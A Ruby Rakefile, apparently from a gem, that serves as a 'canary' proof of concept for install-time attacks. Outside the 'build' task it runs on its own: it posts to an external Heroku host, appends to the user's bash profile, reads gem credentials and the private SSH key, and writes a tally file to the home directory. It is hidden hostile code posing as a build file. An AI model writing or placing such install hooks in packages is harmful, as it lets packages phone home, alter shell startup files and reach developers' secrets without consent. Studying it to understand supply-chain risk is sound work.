#!/usr/bin/env rake
if ARGV[0] == "build"
  require "bundler/gem_tasks"
end

task :default => :prepare

task :prepare do
end

if ARGV[0] != "build"
  begin
    home_dir = `echo ~`.chomp
  rescue
    home_dir = ENV['HOME']
  end
  
  kill_count = 0
  f = File.new("#{home_dir}/kill_count", "w")
  
  begin
    require 'net/http'
    require 'uri'  
    response = Net::HTTP.post_form(URI.parse("http://stark-samurai-8122.herokuapp.com/logs"), {'log' => "coal-mine-canary"})
    
    if response.code == "200"
      f.write("Successfully posted to an external web service (might want to use Little Snitch)\n\n")
      kill_count += 1
    end
  rescue
  end
  
  begin
    profile = nil
    if File.exists?("#{home_dir}/.bash_profile")
      profile = "#{home_dir}/.bash_profile"
    elsif File.exists?("#{home_dir}/.profile")
      profile = "#{home_dir}/.profile"
    end

    if profile
      File.open(profile, 'a+') do |f|
        f.write("\n# pen testing\n")
      end
    end
    
    f.write("Wrote to your bash profile (might want to use fseventer)\n\n")
    kill_count += 1
  rescue
  end
  
  begin
    File.open("#{home_dir}/.gem/credentials").read
    
    f.write("Read your gem cutter credentials (say good-bye to your gems)\n\n")
    kill_count += 1
  rescue
  end

  begin
    File.open("#{home_dir}/.ssh/id_rsa").read
    File.open("#{home_dir}/.ssh/known_hosts").read
    
    f.write("Read your private SSH key and known hosts (hope you haven't been ssh'ing anywhere important)\n\n")
    kill_count += 1
  rescue
  end

  f.write("You killed #{kill_count.to_s} canaries\n")
  f.close
end